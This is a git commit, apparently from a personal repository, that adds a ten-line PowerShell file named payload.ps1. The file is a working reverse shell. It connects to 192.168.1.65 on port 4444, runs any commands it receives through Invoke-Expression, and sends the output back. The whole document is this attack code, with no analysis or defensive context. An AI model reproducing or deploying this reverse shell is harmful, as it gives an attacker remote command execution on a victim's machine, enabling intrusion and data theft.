75730bbb758ead55b8fb924bb03261018cb056dd
Muhammad Hayyan <muhammadhayyan000@gmail.com>
2024-09-07 14:02:01 +0500

    Add files via upload

---
+++ payload.ps1
@@ -0,0 +1,10 @@
+$client = New-Object System.Net.Sockets.TCPClient('192.168.1.65', 4444)
+$stream = $client.GetStream()
+[byte[]]$buffer = 0..65535 | ForEach-Object { 0 }
+while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
+    $result = (Invoke-Expression $data 2>&1 | Out-String)
+    $sendback = ([text.encoding]::ASCII).GetBytes($result + 'PS ' + (pwd).Path + '> ')
+    $stream.Write($sendback, 0, $sendback.Length)
+}
+$client.Close()
